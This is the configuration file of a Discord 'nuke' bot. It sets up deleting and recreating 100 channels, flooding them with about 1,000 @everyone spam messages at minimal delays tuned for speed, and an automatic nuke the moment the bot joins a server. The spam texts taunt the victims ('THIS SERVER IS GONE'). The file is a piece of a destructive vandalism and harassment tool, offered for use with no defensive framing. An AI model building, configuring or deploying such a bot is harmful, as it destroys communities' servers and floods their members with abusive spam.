// config.js - ULTRA FAST SETTINGS
require('dotenv').config();

module.exports = {
    // Bot Settings
    token: process.env.DISCORD_TOKEN || 'YOUR_BOT_TOKEN_HERE',
    prefix: '!',
    
    // MASSIVE NUKE SETTINGS
    channelName: 'IMPOSTER-network',
    spamMessage: '@everyone **NUKE BY RICK SER** 💀 @everyone', // Includes @everyone
    channelsToCreate: 100,        // 100 CHANNELS
    messagesPerChannel: 10,        // 10 MESSAGES EACH = 1000 TOTAL MESSAGES
    
    // ULTRA FAST DELAYS (MINIMAL to maximize speed)
    delays: {
        delete: 100,       // Super fast deletion (100ms)
        create: 150,        // Fast creation (150ms)
        spam: 50,           // Rapid fire spam (50ms)
        embed: 100          // Fast embed sending
    },
    
    // Auto Nuke Settings
    autoNukeOnJoin: true,  // Instant nuke on join
    
    // Server Settings
    port: process.env.PORT || 3000,
    
    // Bot Status Messages
    statusMessages: [
        '💀 MASS NUKE READY',
        '🔥 100 CHANNELS',
        '⚡ 1000 @everyone SPAM',
        '💀 BY RICK SER'
    ],
    
    // SPAM MESSAGES WITH @EVERYONE
    spamMessages: [
        '@everyone 💀 **NUKE BY RICK SER** 💀 @everyone',
        '@everyone 🔥 **IMPOSTER NETWORK TAKEOVER** 🔥 @everyone',
        '@everyone ⚡ **100 CHANNELS DESTROYED** ⚡ @everyone',
        '@everyone 💀 **THIS SERVER IS GONE** 💀 @everyone',
        '@everyone 🔥 **@EVERYONE SPAM ACTIVE** 🔥 @everyone'
    ]
};
